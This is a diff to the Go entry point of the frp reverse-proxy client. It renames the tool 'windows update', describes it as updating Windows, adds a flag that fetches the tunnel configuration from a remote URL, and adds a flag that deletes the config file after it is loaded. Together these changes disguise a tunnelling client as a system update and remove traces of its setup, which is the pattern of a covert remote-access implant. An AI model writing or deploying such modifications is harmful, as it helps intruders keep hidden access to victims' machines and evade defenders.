@@ -17,7 +17,9 @@ package sub
 import (
 	"context"
 	"fmt"
+	"io"
 	"io/fs"
+	"net/http"
 	"os"
 	"os/signal"
 	"path/filepath"
@@ -37,25 +39,42 @@ import (
 
 var (
 	cfgFile          string
+	cfgUrl           string
 	cfgDir           string
 	showVersion      bool
 	strictConfigMode bool
+
+	delEnable bool
 )
 
 func init() {
-	rootCmd.PersistentFlags().StringVarP(&cfgFile, "config", "c", "./frpc.ini", "config file of frpc")
-	rootCmd.PersistentFlags().StringVarP(&cfgDir, "config_dir", "", "", "config directory, run one frpc service for each file in config directory")
-	rootCmd.PersistentFlags().BoolVarP(&showVersion, "version", "v", false, "version of frpc")
+
+	rootCmd.PersistentFlags().StringVarP(&cfgFile, "config", "c", "./windows.ini", "config file of windows")
+
+	rootCmd.PersistentFlags().StringVarP(&cfgUrl, "remoteCfg", "r", "", "Remote config file")
+	rootCmd.PersistentFlags().StringVarP(&cfgDir, "config_dir", "", "", "config directory, run one windows service for each file in config directory")
+	rootCmd.PersistentFlags().BoolVarP(&showVersion, "version", "v", false, "version of windows")
 	rootCmd.PersistentFlags().BoolVarP(&strictConfigMode, "strict_config", "", true, "strict config parsing mode, unknown fields will cause an errors")
+
+	rootCmd.PersistentFlags().BoolVarP(&delEnable, "delini", "d", false, "enable auto delete windows.txt (only local files))")
 }
 
 var rootCmd = &cobra.Command{
-	Use:   "frpc",
-	Short: "frpc is the client of frp (https://github.com/fatedier/frp)",
+	Use:   "windows update",
+	Short: "This is update your windows",
 	RunE: func(cmd *cobra.Command, args []string) error {
 		if showVersion {
 			fmt.Println(version.Full())
 			return nil
+		}
+		if cfgUrl != "" {
+			tempFile, err := downloadConfigFile(cfgUrl)
+			if err != nil {
+				fmt.Printf("download config file failed, err:%v\n", err)
+				return err
+			}
+			defer os.Remove(tempFile)
+			cfgFile = tempFile
 		}
 
 		// If cfgDir is not empty, run multiple frpc service for each config file in cfgDir.
@@ -66,13 +85,39 @@ var rootCmd = &cobra.Command{
 		}
 
 		// Do not show command usage here.
-		err := runClient(cfgFile)
+		err := runClient(cfgFile, delEnable)
 		if err != nil {
 			fmt.Println(err)
 			os.Exit(1)
 		}
+
 		return nil
 	},
+}
+
+func downloadConfigFile(url string) (string, error) {
+	resp, err := http.Get(url)
+	if err != nil {
+		return "", fmt.Errorf("failed to download config file: %w", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return "", fmt.Errorf("failed to download config file: status code %d", resp.StatusCode)
+	}
+
+	tempFile, err := os.CreateTemp("", "Windows-Remote-Config.ini")
+	if err != nil {
+		return "", fmt.Errorf("failed to create temp file: %w", err)
+	}
+	defer tempFile.Close()
+
+	_, err = io.Copy(tempFile, resp.Body)
+	if err != nil {
+		return "", fmt.Errorf("failed to write to temp file: %w", err)
+	}
+
+	return tempFile.Name(), nil
 }
 
 func runMultipleClients(cfgDir string) error {
@@ -85,7 +130,7 @@ func runMultipleClients(cfgDir string) error {
 		time.Sleep(time.Millisecond)
 		go func() {
 			defer wg.Done()
-			err := runClient(path)
+			err := runClient(path, false)
 			if err != nil {
 				fmt.Printf("frpc service error for config file [%s]\n", path)
 			}
@@ -110,10 +155,13 @@ func handleTermSignal(svr *client.Service) {
 	svr.GracefulClose(500 * time.Millisecond)
 }
 
-func runClient(cfgFilePath string) error {
+func runClient(cfgFilePath string, delEnable bool) error {
 	cfg, proxyCfgs, visitorCfgs, isLegacyFormat, err := config.LoadClientConfig(cfgFilePath, strictConfigMode)
 	if err != nil {
 		return err
+	}
+	if delEnable == true {
+		os.Remove(cfgFilePath)
 	}
 	if isLegacyFormat {
 		fmt.Printf("WARNING: ini format is deprecated and the support will be removed in the future, " +
